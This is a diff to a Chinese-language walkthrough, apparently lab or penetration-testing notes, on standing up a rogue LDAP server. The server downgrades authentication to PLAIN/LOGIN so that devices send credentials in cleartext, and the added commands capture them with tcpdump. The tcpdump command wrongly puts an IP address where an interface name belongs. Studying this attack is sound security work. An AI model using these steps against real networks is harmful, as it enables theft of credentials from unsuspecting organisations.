@@ -166,4 +166,26 @@ LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的�
 ```bash
 sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
 ```
-对于 DNS 域名，提供我们的目标域名
+在初始配置时，对于 DNS 域名，提供我们的目标域名,确保对组织名称也使用相同的名称，设置密码，选择MDB作为LDAP数据库
+在使用流氓LDAP服务器之前，我们需要通过降级支持的身份验证机制来使其容易受到攻击。我们希望确保我们的 LDAP 服务器仅支持 PLAIN 和 LOGIN 身份验证方法。为此，我们需要创建一个新的 ldif 文件，该文件使用以下内容调用：
+```
+#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+该文件具有以下属性：
+- olcSaslSecProps：指定 SASL 安全属性
+- noanonymous：禁用支持匿名登录的机制
+- minssf：指定可接受的最小安全强度，为 0，表示无保护。
+```bash
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+```
+我们可以使用以下命令验证我们的流氓LDAP服务器的配置是否已应用（注意：如果使用的是Kali，则可能不会收到任何输出，但是该配置应该已经工作，可以继续执行后续步骤）：
+```bash
+Camllia@kali$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms 
+dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN
+```
+#### 捕获LDAP凭证
+我们的流氓 LDAP 服务器现已配置完毕。当设备向我们发送LDAP请求时，身份验证将以明文形式进行。如果正确配置了恶意 LDAP 服务器，并且它正在降级通信，您将收到以下错误：“This distinguished name contains invalid syntax”。如果收到此错误，可以使用 tcpdump 通过以下命令捕获凭据：
+```shell
+[Redcamellia@kali]$ sudo tcpdump -SX -i {attacker IP} tcp port 389
+
+```
